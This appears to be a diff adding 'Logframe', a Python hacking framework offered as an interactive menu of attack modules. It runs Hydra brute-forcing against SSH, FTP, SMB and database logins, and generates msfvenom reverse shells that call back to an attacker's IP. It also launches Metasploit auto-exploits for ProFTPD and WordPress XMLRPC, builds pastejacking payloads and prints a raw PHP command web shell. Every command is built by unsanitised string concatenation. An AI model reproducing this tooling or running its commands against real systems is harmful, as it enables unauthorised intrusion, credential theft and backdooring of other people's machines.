@@ -1,0 +1,477 @@
+#!/usr/bin/python3
+import requests
+import os
+import socket
+import sys
+red = '\033[31m'
+green = '\033[32m'
+white = '\033[37m'
+execute=os.system
+uagent='"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"'
+def logo():
+    print(white+"""
+ ==[🄱🄻🄰🄲🄺-🄷🄰🅃-🄴🄳🄸🅃🄸🄾🄽]==
+╔╗\033[31m───────────\033[37m╔═══╗
+║║\033[31m───────────\033[37m║╔══╝
+║║\033[31m──\033[37m╔══╦══╗\033[31m──\033[37m║╚══╦═╦══╦╗╔╦══╗
+║║\033[31m─\033[37m╔╣╔╗║╔╗╠══╣╔══╣╔╣╔╗║╚╝║║═╣          DEV | JoyGhosh
+║╚═╝║╚╝║╚╝╠══╣║\033[31m──\033[37m║║║╔╗║║║║║═╣          VER | 1.0.1
+╚═══╩══╩═╗║\033[31m──\033[37m╚╝\033[31m──\033[37m╚╝╚╝╚╩╩╩╩══╝
+\033[31m───────\033[37m╔═╝║
+\033[31m───────\033[37m╚══╝
+
+""")
+logo()
+url = input("Enter Your Target Url:- ")
+urlh = "https://"+url
+execute('clear')
+logo()
+def mainmenu():
+    print("""
+[\033[32m+\033[37m] show-target   (Show Target Url)
+[\033[32m+\033[37m] ip-locate     (Locate an Ip Adress)
+[\033[32m+\033[37m] enu-mod       (Show Avilable Enumeration Modules)
+[\033[32m+\033[37m] hydra-mod     (Show Avilable Modules For Hydra)
+[\033[32m+\033[37m] sys-mod       (Show Avilable System Modules)
+[\033[32m+\033[37m] anon-mod      (Show Avilable Anonymity Modules)
+[\033[32m+\033[37m] back-mod      (Show Avilable Backdoor Generator Modules)
+[\033[32m+\033[37m] ex-mod        (Show Avilable Auto Exploits Modules)
+[\033[32m+\033[37m] pen-tool      (Show Avilable Pentesting Tools)
+[\033[32m+\033[37m] clear         (To Clear Terminal)
+[\033[32m+\033[37m] version       (To Show Current version Of Logframe)
+[\033[32m+\033[37m] restart       (To Restart Logframe)
+[\033[32m+\033[37m] exit          (To Exit Logframe)
+[\033[32m+\033[37m] htb           (Hack The Box's Module)
+[\033[32m+\033[37m] msf-handler   (To Lunch Metasploit Handler)
+    """)
+def enu():
+    print("""
+[\033[31m--\033[37m] enu-sub1        (Enumerate Subdomains Using Sublist3r)
+[\033[31m--\033[37m] enu-sub2        (Enumerate Subdomains Using Built In Tool)
+[\033[31m--\033[37m] enu-sub3        (Enumerate Subdomains Using Bruteforce fast)
+[\033[31m--\033[37m] enu-page1       (Enumerate Pagelinks Using Lynx)
+[\033[31m--\033[37m] enu-page2       (Enumerate Page Links Using Gooogle Search)
+[\033[31m--\033[37m] enu-port        (Enumerate Ports Using Nmap)
+[\033[31m--\033[37m] enu-port1       (Enumerate Ports Using Masscan)
+[\033[31m--\033[37m] enu-dir         (Enumerate Active Directory Using Wfuzz)
+[\033[31m--\033[37m] enu-dir2        (Enumerate Active Directory Using Metasploit)
+[\033[31m--\033[37m] enu-dir3        (Enumerate Active Directory Using dirb)
+[\033[31m--\033[37m] enu-indx        (Enumerate Directory Listing Using Google Search)
+[\033[31m--\033[37m] enu-wpu         (Enumerate Wordpress Username Using Built In Tool)
+[\033[31m--\033[37m] enu-wpu1        (Enumerate Wordpress Username Using wp-json)
+[\033[31m--\033[37m] enu-wpu2        (Enumerate Wordpress Username Using Wpscan)
+[\033[31m--\033[37m] enu-zone        (Enumerate Zone Record Using dnsenum)
+
+    """)
+def hydra():
+    print(green+"""
+[*] hydra-ftp             (To Crack Ftp Using hydra)
+[*] hydra-ssh             (To Crack SSh Using Hydra)
+[*] hydra-mysql           (To Crack mysql using hydra)
+[*] hydra-postgresql      (To Crack Postgresql Using Hydra)
+[*] hydra-cisco           (To Crack Cisco using hydra)
+[*] hydra-smb             (To Crack Smb Using Hydra)
+[*] hydra-telnet          (To Crack Telnet Using Hydra)
+"""+white)
+def sys():
+    print("""
+[$] show-mac         (To Show Your Computer Mac Adress)
+[$] whatismyip       (To Show Your Public ip Adress)
+[$] searchsploit     (Auto Exploit Finder)
+
+    """)
+def anon():
+    print("""
+[%] vpn          (To Download and Auto COnnect To an Vpn server Using Openvpn)
+[%] tor          (Connect To Tor)
+[%] random-mac   (To Change Mac Adress To an Random MAc Adress [Temporary])
+
+    """)
+def backdoor():
+    print("""
+[~] gen-phpreverseshell            (Generate Php Reverse shell Using Msfvenom)
+[~] gen-windowsuser                (Generate Windows add User Payload)
+[~] gen-pyreverseshell             (Generate Python Reverse shell)
+[~] gen-phpbackdoor                (Generate Simple Backdoor Written In Php)
+[~] gen-jspshell                   (Generate Simple Jsp Reverse shell)
+[~] gen-pastejacking               (Pastejacking Example Generator)
+    """)
+def exploits():
+    print("""
+[\033[31m!\033[37m] ex-modcopy                         (ProFTPD 1.3.5 Mod_Copy Command Execution )(Auto\033[32m*\033[37m)
+[\033[31m!\033[37m] ex-ftpb                            (ProFTPD-1.3.3c Backdoor Command Execution)(Auto\033[32m*\033[37m)
+[\033[31m!\033[37m] ex-xmrpc                           (Wordpress XMLRPC DoS)(Auto\033[32m*\033[37m)
+[\033[31m!\033[37m] ex-xmghost                         (WordPress XMLRPC GHOST Vulnerability Scanner)(Auto\033[32m*\033[37m)
+[\033[31m!\033[37m] ex-xmleval                         (PHP XML-RPC Arbitrary Code Execution)(Auto\033[32m*\033[37m)
+
+    """)
+def pentool():
+    print("""
+(=_+) xss-scan                                  (Scan For xss Auto Using Xsscon)
+(=_+) beef-xss                                  (Beef Xss Explotion Framework)
+(=_+) commix                                    (operating system command injection and exploitation)
+(=_+) reccoon                                   (Reconnaissance Target With reccooon)
+(=_+) bandit                                    (Python Source code Vulnerability Scanner bandit)
+(=_+) cewl                                      (Custom Wordlist Generator cewl)
+(=_+) whatweb                                   (Next generation web scanner whatweb)
+(=_+) xsrf-scan                                 (Xsrf scan using xsrfprobe)
+(=_+) cadaver                                   (Put Vulnerability Exploition Using Cadaver)
+(=_+) wafw00f                                   (WebApplication Firewall Scanner )
+
+    """)
+
+def main():
+    inp=inp=input(red+"Logframe@root~ "+white)
+    if inp=="version":
+        print("""
+|[] Version:- 01
+|[] Release:- 2020
+        """)
+        main()
+    elif inp=="Devloper":
+        print("""
++ JoyGhosh
++ Joyghosh@system00.xyz
++ https://joyghosh.info
++ joychondroghosh@gmail.com [*]
+        """)
+        main()
+    elif inp=="show-target":
+        print('Target: [ '+urlh+' ]')
+        print('IP:- '+socket.gethostbyname(url))
+        main()
+    elif inp=="clear":
+        execute("clear")
+        main()
+    elif inp=="help":
+        mainmenu()
+        main()
+    elif inp=="exit":
+        exit()
+    elif inp=="restart":
+        execute("./framework")
+    elif inp=="enu-mod":
+        enu()
+        main()
+    elif inp=="enu-sub1":
+        execute('sublist3r -d '+url+' -o '+url+'.txt')
+        print("Output Saved In ")
+        execute('pwd')
+        main()
+    elif inp=="enu-sub2":
+        execute('./bin/subrecon '+url+'> subdomain.'+url+'.txt')
+        execute('cat '+'subdomain.'+url+'.txt')
+        print('---------------------------------------')
+        print("Output Saved In")
+        execute('pwd')
+        main()
+    elif inp=="enu-sub3":
+        wlist=input("Enter Your Wordlist Path:- ")
+        execute('./bin/subbrute '+url+' '+wlist)
+        print('---------------------------------------')
+        opti=input("Do You Want To Save Output y/n ")
+        if opti=="y":
+            print("Saving Output Please Wait")
+            execute('./bin/subbrute '+url+' '+wlist+' > '+url+'.sub.txt')
+            print("Output Saved In")
+            execute('pwd')
+            main()
+        else:
+            main()
+    elif inp=="enu-page1":
+        execute('lynx -listonly -dump '+url)
+        print('---------------------------------------')
+        opti=input("Do You Want To Save Output y/n ")
+        if opti=="y":
+            print("Saving Output Please Wait")
+            execute('lynx -listonly -dump '+url+' > '+url+'.page.txt')
+            print("Output Saved In")
+            execute('pwd')
+            main()
+        else:
+            main()
+    elif inp=="enu-page2":
+        execute('./bin/google site:'+url)
+        print('---------------------------------------')
+        opti=input("Do You Want To Save Output y/n ")
+        if opti=="y":
+            print("Saving Output Please Wait")
+            execute('./bin/google site:'+url+' >'+url+'.pagelink.txt')
+            print("Output Saved In")
+            execute('pwd')
+            main()
+        else:
+            main()
+    elif inp=="enu-port":
+        execute("nmap -Pn "+url)
+        main()
+    elif inp=="enu-port1":
+        re=input("Target Is Set To "+url+"You Want To Change Target y/n: ")
+        if re=="y":
+            ip=input("Enter Target Ip:- ")
+            execute('masscan -p1-9000 '+ip+' --rate=1000')
+            main()
+        else:
+            ip=socket.gethostbyname(url)
+            execute('masscan -p1-9000 '+ip+' --rate=1000')
+            main()
+    elif inp=="enu-dir":
+        wordlist=input("Enter Wordlist Path:- ")
+        execute("wfuzz -w "+wordlist+' '+url+'/FUZZ')
+        main()
+    elif inp=="enu-dir2":
+        wordlist=input("Enter Wordlist Path:- ")
+        execute('./bin/msfdir '+wordlist+' '+url)
+        execute('msfconsole -r dir.rc')
+        execute('rm dir.rc')
+        main()
+    elif inp=="enu-dir3":
+        execute('dirb '+urlh)
+        main()
+    elif inp=="enu-index":
+        execute('./bin/google intext:"index of" site:'+url)
+        print('---------------------------------------')
+        opti=input("Do You Want To Save Output y/n ")
+        if opti=="y":
+            print("Saving Output Please Wait")
+            execute('./bin/google site:'+url+' >'+url+'.indexof.txt')
+            print("Output Saved In")
+            execute('pwd')
+            main()
+        else:
+            main()
+    elif inp=="enu-wpu":
+        execute('./bin/wpauthor '+urlh)
+        main()
+    elif inp=="enu-wpu1":
+        execute('./bin/wpjson '+urlh)
+        main()
+    elif inp=="enu-wpu2":
+        execute('wpscan --url '+url+' -e u')
+        main()
+    elif inp=="enu-zone":
+        execute('dnsenum '+url)
+        main()
+    elif inp=="hydra-mod":
+        hydra()
+        main()
+    elif inp=="logo":
+        logo()
+        main()
+    elif inp=="hydra-ftp":
+        ip=input("Enter Host Or Ip Adress Of ftp Server:- ")
+        user=input("Enter Username List Path:- ")
+        passw=input("Enter Password List Path:- ")
+        execute('hydra -t 1 -L '+user+' -P '+passw+' -vV '+ip+' ftp')
+        main()
+    elif inp=="hydra-ssh":
+        ip=input("Enter Host Or Ip Adress Of SSH Server:- ")
+        user=input("Enter Username list Path:- ")
+        passw=input("Enter Password List Path:- ")
+        execute('hydra -L '+user+' -P '+passw+' '+ip+' -t 4 ssh')
+        main()
+    elif inp=="hydra-mysql":
+        ip=input("Enter Host Or Ip Adress Of Mysql Server:- ")
+        user=input("Enter Username List Path:- ")
+        passw=input("Enter Password List Path:- ")
+        execute('hydra -L '+user+' -P '+passw+' '+ip+' mysql -V -f')
+        main()
+    elif inp=="hydra-smb":
+        ip=input("Enter Host Or Ip Adress Of SMB Server:- ")
+        user=input("Enter Username List Path:- ")
+        passw=input("Enter Password List Path:- ")
+        execute('hydra -L '+user+' -P '+passw+' '+ip+' smb -V -f')
+        main()
+    elif inp=="hydra-telnet":
+        ip=input("Enter Host Or Ip Adress Of Telnet Server:- ")
+        user=input("Enter Username List Path:- ")
+        passw=input("Enter Password List Path:- ")
+        execute('hydra -L '+user+' -P '+passw+' '+ip+' telnet -V -f')
+        main()
+    elif inp=="hydra-cisco":
+        ip=input("Enter Host Or Ip Adress Of Mysql Server:- ")
+        user=input("Enter Username List Path:- ")
+        passw=input("Enter Password List Path:- ")
+        execute('hydra -L '+user+' -P '+passw+' '+ip+' cisco -V -f')
+        main()
+    elif inp=="hydra-postgresql":
+        ip=input("Enter Host Or Ip Adress Of Mysql Server:- ")
+        user=input("Enter Username List Path:- ")
+        passw=input("Enter Password List Path:- ")
+        execute('hydra -L '+user+' -P '+passw+' '+ip+' postgres -V -f')
+        main()
+    elif inp=="sys-mod":
+        sys()
+        main()
+    elif inp=="show-mac":
+        execute("ifconfig | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}")
+        main()
+    elif inp=="whatismyip":
+        execute('dig +short myip.opendns.com @resolver1.opendns.com')
+    elif inp=="searchsploit":
+        expl=input("Enter Exploit Name:")
+        execute('searchsploit '+expl)
+        main()
+    elif inp=="anon-mod":
+        anon()
+        main()
+    elif inp=="vpn":
+        execute("./bin/vpn")
+        main()
+    elif inp=="random-mac":
+        inte=input("Enter Interface To Change Mac:- ")
+        execute("macchanger -r "+inte)
+        main()
+    elif inp=="tor":
+        execute('tor')
+        main()
+    elif inp=="ex-mod":
+        exploits()
+        main()
+    elif inp=="ls":
+        execute('ls')
+        main()
+    elif inp=="ls -al":
+        execute('ls -al')
+        main()
+    elif inp=="gen-phpb":
+        print("""
+        raw:-
+        <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+        """)
+        main()
+    elif inp=="htb":
+        print("""
+(-) crack-emdee         (Flag Finder Emdee five for life)
+(-) crack-freelancer    (Flag Finder For Freelancer)
+        """)
+        main()
+    elif inp=="gen-phpreverseshell":
+        ip=input("Enter Your Public Ip Adress:- ")
+        port=input("Enter Your Fvrt Port Number:- ")
+        execute('msfvenom -p php/meterpreter_reverse_tcp LHOST='+ip+' LPORT='+port+' -f raw > phpreverseshell.php')
+        execute('echo Saved in: ;pwd')
+        main()
+    elif inp=="gen-windowsuser":
+        user=input("ENter Your Username For Windows: ")
+        pas=input("Enter Your Password For Windows: ")
+        execute('msfvenom -p windows/adduser USER='+user+' PASS='+pas+' -f exe > adduserpayload.exe')
+        execute('echo Saved in: ;pwd')
+        main()
+    elif inp=="gen-pyreverseshell":
+        ip=input("Enter Your Public Ip Adress:- ")
+        port=input("Enter Your Fvrt Port Number:- ")
+        execute('msfvenom -p cmd/unix/reverse_python LHOST='+ip+' LPORT='+port+' -f raw > pythonreverseshell.py')
+        execute('echo Saved in: ;pwd')
+        main()
+    elif inp=="ex-modcopy":
+        ip=input("Enter Target Ip Adress:- ")
+        execute('./bin/modcopy '+ip)
+        execute('msfconsole -r modcopy.rc')
+        execute('rm modcopy.rc')
+        main()
+    elif inp=="ex-ftpb":
+        ip=input("Enter Target Ip Adress:- ")
+        execute('./bin/backdoorftpd '+ip)
+        execute('msfconsole -r bdoorftpd.rc')
+        execute('rm bdoorftpd.rc')
+        main()
+    elif inp=="ex-xmrpc":
+        ip=input("Enter Your Target Ip or host name:- ")
+        req=input("Enter The Number Of Request To Send:- ")
+        execute('./bin/xmlrpcd '+ip+' '+req)
+        execute('msfconsole -r xmlrpcd.rc')
+        execute('rm xmlrpcd.rc')
+        main()
+    elif inp=="ex-xmghost":
+        ip=input("Enter Your Target Ip or host name:- ")
+        execute('./bin/xmlrpcd '+ip)
+        execute('msfconsole -r xmlrpcg.rc')
+        execute('rm xmlrpcg.rc')
+        main()
+    elif inp=="ex-xmleval":
+        ip=input("Enter Your Target Ip or host name:- ")
+        execute('./bin/xmeval '+ip)
+        execute('msfconsole -r xmeval.rc')
+        execute('rm xmeval.rc')
+        main()
+    elif inp=="crack-emdee":
+        tar=input("Enter Your Target Box Link With ip: ")
+        execute('emdee '+tar)
+        main()
+    elif inp=="reccoon":
+        execute('reccoon '+url)
+        main()
+    elif inp=="commix":
+        u=input("ENter Target Url With Vulnerable Parameter:- ")
+        execute('commix -u '+u)
+        main()
+    elif inp=="msf-handler":
+        ip=input("Enter Remote Ip Adress: ")
+        ipp=input("Enter Local Ip Adress: ")
+        port=input("Enter Port Number Seted On Payload: ")
+        pay=input("Enter Payload To Lunch Handler: ")
+        execute('./bin/msfh '+pay+' '+ip+' '+port+' '+ipp)
+        execute('msfconsole -r msf.rc')
+        execute('rm msf.rc')
+        main()
+    elif inp=="crack-freelancer":
+        tar=input("Enter Target With ip (ex:docker.htb.eu:8808):- ")
+        execute('sqlmap -u '+tar+' --tables')
+        execute('sqlmap -u '+tar+' -t safeadmin --dump')
+        execute('sqlmap -u '+tar+' --file-read=/var/www/html/administat/panel.php')
+        execute('cat /root/.local/share/sqlmap/output/docker.hackthebox.eu/files/_var_www_html_administrat_panel.php')
+        main()
+    elif inp=="bandit":
+        script=str(input("Enter Your Python Script name:- "))
+        execute('bandit '+script)
+        main()
+    elif inp=="beef-xss":
+        execute('beef-xss')
+        main()
+    elif inp=="cewl":
+        u=input("Enter Url To Generate Wordlist:- ")
+        execute('cewl '+u+' -w '+u+'.txt')
+        execute('echo saved in ;pwd')
+        main()
+    elif inp=="xss-scan":
+        execute('python3 XSSCon/xsscon.py -u '+url)
+        main()
+    elif inp=="whatweb":
+        execute('whatweb '+url)
+        main()
+    elif inp=="gen-jspshell":
+        lhost=input("Enter Your Ip Adress:- ")
+        execute('msfvenom -p java/jsp_shell_reverse_tcp LHOST='+ip+' LPORT=4444 >> shell.jsp')
+        print("Saved as : shell.jsp In")
+        execute('pwd')
+        main()
+    elif inp=="xsrf-scan":
+        ul=input("Enter Target To Scan For Xsrf:- ")
+        execute('xsrfprobe --url '+ul+' --crawl --user-agent '+uagent)
+        main()
+    elif inp=="cadaver":
+        urlss=input("Enter Target Url:- ")
+        execute("cadaver "+urlh)
+        main()
+    elif inp=="gen-pastejacking":
+        payload=input("Enter command That Executes After User Copy Something From The Page:- ")
+        execute("./res/pastejacking.sh "+payload)
+        print("Payload Generated :- ")
+        execute("pwd")
+        main()
+    elif inp=="whoami":
+        print('root@logframe')
+        main()
+    elif inp=="check-waf":
+        execute("wafw00f https://"+url)
+        main()
+    elif inp=="ip-locate":
+        ip=input("Enter Your Target Ip Adress:- ")
+        execute('curl http://ip-api.com/json/'+ip+' -s |python -m json.tool')
+        main()
+    else:
+        print('logframe: '+inp+': command not found')
+        main()
+main()
